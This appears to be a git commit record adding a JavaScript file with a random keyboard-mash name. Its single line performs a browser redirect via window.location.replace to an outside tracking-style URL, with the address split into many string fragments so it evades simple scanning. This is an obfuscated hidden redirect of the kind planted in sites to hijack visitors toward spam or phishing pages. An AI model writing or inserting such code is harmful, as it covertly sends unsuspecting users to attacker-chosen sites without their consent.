5f19ac74958cb412bf2b35d73840c65553f20011
Parabeauty <113865732+Parabeauty@users.noreply.github.com>
2022-11-07 17:34:24 +0100

    Create dythdtrgdrjdtgftyjdhgftj.js

---
+++ dythdtrgdrjdtgftyjdhgftj.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`ht`,`tps://ww`,`w.road`,`sworks.c`,`om/gQ_hBEI`,`KQRfu`,`gBl4Sr-C7M`,`Gp0_vJ`,`_TZ0fyk`,`0nl1X5K`,`uTD-X4K`,`ZGc5UC`,`lrWWcIp`,`WPZThWDd`,`3E1YiXt`,`1fK81NR`,`qQ~~/TA`,`HA/KAPO`,`xfrPMa`))
